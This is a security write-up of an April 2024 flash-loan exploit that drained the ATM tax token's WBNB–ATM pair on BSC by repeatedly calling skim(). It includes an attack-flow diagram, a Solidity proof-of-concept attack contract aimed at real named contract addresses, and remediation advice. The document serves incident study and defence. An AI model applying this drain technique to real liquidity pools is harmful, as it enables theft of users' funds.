# ATM — Flash Loan-Based Repeated skim Reserve Drain Analysis

| Field | Details |
|------|------|
| **Date** | 2024-04 |
| **Protocol** | ATM |
| **Chain** | BSC |
| **Loss** | ~$182,000 |
| **V3 Pool** | [0x36696169](https://bscscan.com/address/0x36696169C63e42cd08ce11f5deeBbCeBae652050) |
| **ATM Token** | [0xa5957E0E](https://bscscan.com/address/0xa5957E0E2565dc93880da7be32AbCBdF55788888) |
| **V2 Pair (WBNB-ATM)** | [0x1F5b26DC](https://bscscan.com/address/0x1F5b26DCC6721c21b9c156Bf6eF68f51c0D075b7) |
| **Root Cause** | Directly transferring ATM tokens into the V2 pair causes `balanceOf` to exceed the internal reserve, allowing excess extraction via `skim()` — a business logic flaw with no reserve synchronization |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/ATM_exp.sol) |

---

## 1. Vulnerability Overview

The ATM token has a transfer tax mechanism. By transferring ATM tokens into the V2 pair and repeatedly calling `skim()`, the discrepancy between the reserve and the actual balance accumulates, enabling continuous token extraction. The attacker flash-loaned WBNB from the V3 pool, repeated this pattern to drain the pair's reserve below a threshold, then swapped back to WBNB.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: tax token + skim combination exploit
// ATM token transfer applies tax → actual received amount < sent amount
// skim(): extracts pair.balance - pair.reserve
// Due to tax, reserve updates lag behind actual balance → mismatch occurs

interface Uni_Pair_V2 {
    function skim(address to) external;
    function sync() external;
    function swap(uint, uint, address, bytes calldata) external;
    function getReserves() external view returns (uint112, uint112, uint32);
}

// ✅ Safe code: disable skim on tax token pairs
function skim(address to) external lock {
    require(!isTaxToken, "skim disabled for tax tokens");
    // ...
}
```

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: ATM_decompiled.sol
contract ATM {
    function balanceOf(address p0) external view returns (uint256) {}  // ❌ Vulnerability
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Flash loan WBNB from V3 pool
  │
  ├─→ [2] Swap WBNB → ATM (via USDT)
  │
  ├─→ [3] Transfer ATM to V2 pair → repeat skim()
  │         └─ Reserve decreases until below threshold
  │
  ├─→ [4] Swap ATM → WBNB (reverse swap)
  │
  ├─→ [5] Repay V3 flash loan
  │
  └─→ [6] ~$182K profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface Uni_Pair_V3 {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface Uni_Pair_V2 {
    function skim(address to) external;
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function getReserves() external view returns (uint112, uint112, uint32);
}

contract AttackContract {
    Uni_Pair_V3 constant v3Pool = Uni_Pair_V3(0x36696169C63e42cd08ce11f5deeBbCeBae652050);
    Uni_Pair_V2 constant v2Pair = Uni_Pair_V2(0x1F5b26DCC6721c21b9c156Bf6eF68f51c0D075b7);
    IERC20      constant ATM    = IERC20(0xa5957E0E2565dc93880da7be32AbCBdF55788888);
    IERC20      constant WBNB   = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);

    function testExploit() external {
        v3Pool.flash(address(this), 0, flashAmount, "");
    }

    function pancakeV3FlashCallback(uint256, uint256, bytes calldata) external {
        // [1] Swap WBNB → ATM
        swapWBNBToATM(flashAmount);

        // [2] Transfer ATM to pair, then repeat skim
        (uint112 r0,,) = v2Pair.getReserves();
        while (r0 > threshold) {
            ATM.transfer(address(v2Pair), atmChunk);
            v2Pair.skim(address(this));
            (r0,,) = v2Pair.getReserves();
        }

        // [3] Swap ATM → WBNB (reverse swap)
        swapATMToWBNB(ATM.balanceOf(address(this)));

        // [4] Repay flash loan
        WBNB.transfer(address(v3Pool), flashAmount + fee);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Tax token repeated skim reserve drain |
| **CWE** | CWE-840: Business Logic Error |
| **Attack Vector** | External (flash loan + repeated skim) |
| **DApp Category** | Tax token + Uniswap V2 pair |
| **Impact** | WBNB drained via pair reserve depletion |

## 6. Remediation Recommendations

1. **Disable skim on tax token pairs**: Disable `skim()` for pairs involving tokens with transfer taxes
2. **skim cooldown**: Block repeated skim calls within the same block
3. **Minimum reserve protection**: Block skim if reserve falls below a threshold
4. **Tax-token-specific AMM**: Use a fee-aware AMM instead of standard V2 AMM for tax tokens

## 7. Lessons Learned

- The combination of tax tokens and Uniswap V2 `skim()` is a recurring attack pattern that has been exploited repeatedly on BSC.
- Transfer tax mechanisms break the consistency of AMM reserve calculations.
- Before deploying tax tokens, thoroughly verify compatibility with standard AMMs.